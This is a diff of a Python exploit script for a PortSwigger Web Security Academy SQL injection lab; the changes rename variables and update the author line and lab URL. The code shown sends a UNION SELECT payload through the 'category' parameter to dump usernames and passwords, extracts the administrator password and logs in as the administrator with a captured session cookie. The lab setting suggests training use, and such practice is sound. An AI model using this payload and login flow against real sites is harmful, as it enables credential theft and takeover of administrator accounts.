@@ -1,6 +1,6 @@
 #########################################################################################
 #
-# Author: Ahmed Elqalawii
+# Author: Ahmed Elqalawy (@elqal3awii)
 #
 # Date: 21/9/2023
 #
@@ -26,18 +26,18 @@ import re
 # Main
 #########
 # change this url to your lab
-url = "https://0a7a00da049292ad81a8b68700030001.web-security-academy.net"
+url = "https://0a8f001903fe274381af614c008900dc.web-security-academy.net"
 print(Fore.BLUE + "[#] Injection parameter: " + Fore.YELLOW + "category")
 
 try:
     # payload to retreive the password of the administrator
-    admin_password_payload = f"' UNION SELECT null, concat(username , ':', password) from users-- -"
+    payload = f"' UNION SELECT null, concat(username , ':', password) from users-- -"
     # fetch the page with the injected payload
-    admin_password_injection = requests.get(
-        f"{url}/filter?category={admin_password_payload}")
+    injection = requests.get(
+        f"{url}/filter?category={payload}")
     # extract the administrator password
     admin_password = re.findall("<th>administrator:(.*)</th>",
-                                admin_password_injection.text)[0]
+                                injection.text)[0]
     print(Fore.WHITE + "1. Retrieving administrator password from users table.. " +
           Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)
 
@@ -61,12 +61,12 @@ try:
             cookies = {
                 "session": session
             }
-            login_inject = requests.post(f"{url}/login", data,
+            login = requests.post(f"{url}/login", data,
                                          cookies=cookies, allow_redirects=False)
             print(
                 Fore.WHITE + "4. Logging in as the administrator.. " + Fore.GREEN + "OK")
             # extract new session
-            new_session = login_inject.cookies.get("session")
+            new_session = login.cookies.get("session")
             cookies = {
                 "session": new_session
             }
